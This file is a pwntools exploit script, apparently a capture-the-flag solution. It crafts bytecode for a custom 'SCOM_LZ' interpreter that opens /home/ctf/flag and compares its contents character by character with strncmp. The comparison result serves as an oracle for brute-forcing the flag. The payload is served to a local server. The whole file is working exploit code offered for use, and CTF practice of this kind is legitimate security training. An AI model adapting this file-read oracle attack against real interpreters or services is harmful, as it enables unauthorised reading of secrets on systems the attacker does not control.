#!/usr/bin/python3

from pwn import *

printable = """0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~"""

"""
  (plVar1->code).count = 0;             # 4 bytes
  (plVar1->code).capacity = 0;          # 4 bytes
  (plVar1->code).data = (char *)0x0;    # 8 bytes
  (plVar1->number).count = 0;
  (plVar1->number).capacity = 0;
  (plVar1->number).data = (int *)0x0;
  (plVar1->string).count = 0;
  (plVar1->string).capacity = 0;
  (plVar1->string).data = (char **)0x0;
  (plVar1->word).count = 0;
  (plVar1->word).capacity = 0;
  (plVar1->word).data = (char **)0x0;
"""

call = p8(0x4)
jz = p8(0x5)
load_word = p8(0x3)
load_number = p8(0x1)
load_string = p8(0x2)

def push_word(index):
    return load_word + p8(index)

def push_number(index):
    return load_number + p8(index)

def push_string(index):
    return load_string + p8(index)

def call_write():
    return call + p8(0)

def call_read():
    return call + p8(1)

def call_open():
    return call + p8(2)

def call_strncmp():
    return call + p8(3)

def call_memcpy():
    return call + p8(4)

def jump_if_zero(back=0):
    return jz + p8(back) + p8(0x10) + p8(0x10);


flag = ""
j = 1
while (1):
    for _ in printable:
        #open(flag, 0, 0)
        code  = push_string(0x1)
        code += push_number(0)
        code += push_number(0x0) # at index
        code += call_open()

        # read(flag_fd, somewhere, 1)
        read = push_number(0x4)
        read += push_string(0x1)
        read += push_number(0x2)
        read += call_read()
        
        code += (read)*j

        # strncmp(somewhere, our_char, 1)
        code += push_string(0x1)
        code += push_string(0x2)
        code += push_number(0x2)
        code += call_strncmp()

        # if the character is found the ret is 0, so we jump elsewhere
        # (if we get hello then we guessed the wrong one!)
        code += jump_if_zero()

        code += push_number(2)
        code += push_string(0)
        code += push_number(3)
        code += call_write()



        payload  = b"SCOM_LZ\x00" # magic
        payload += p32(len(code)) # code.count
        # code starts here
        payload += code

        payload += p32(0x5) # number.count (it will be alloced as number.count * 4)
        # numbers here
        payload += p32(0) + p32(3) + p32(0x1) + p32(0x5) + p32(4) # all numbers here


        #word count
        word_count = 0x5
        #string count
        string_count = 0x3

        payload += p32(string_count)
        payload += p32(word_count)


        # strings
        payload += p32(0x10) # len
        payload += b"hello".ljust(0x10, p8(0)) # string
        payload += p32(0x10) # len
        payload += b"/home/ctf/flag".ljust(0x10, p8(0)) # string
        payload += p32(0x10)
        payload += bytes([ord(_)]) +b"AAA" + p8(0) * (0x10 - 0x4)

        # words
        payload += p32(0x10) # len
        payload += b"Rudolph".ljust(0x10, p8(0)) # word
        payload += p32(0x10) # len
        payload += b"Dasher".ljust(0x10, p8(0)) # word
        payload += p32(0x10) # len
        payload += b"Dancer".ljust(0x10, p8(0)) # word
        payload += p32(0x10) # len
        payload += b"Prancer".ljust(0x10, p8(0)) # word
        payload += p32(0x10) # len
        payload += b"Vixen".ljust(0x10, p8(0)) # word

        # print("[%s]", payload)

        with open("exp.scom", "wb") as f:
            f.write(payload)

        link = b"http://127.0.0.1:8000/exp.scom"
        p = process(["python3", "server.py"])
        p.recv()
        p.sendline(link)
        try:
            for i in range(6):
                data = p.recvline()
        except:
            print("Found! ", _)
            j += 1

            flag += _
            if _ == "}":
                print(flag)
                exit(1)
            break
        p.close()
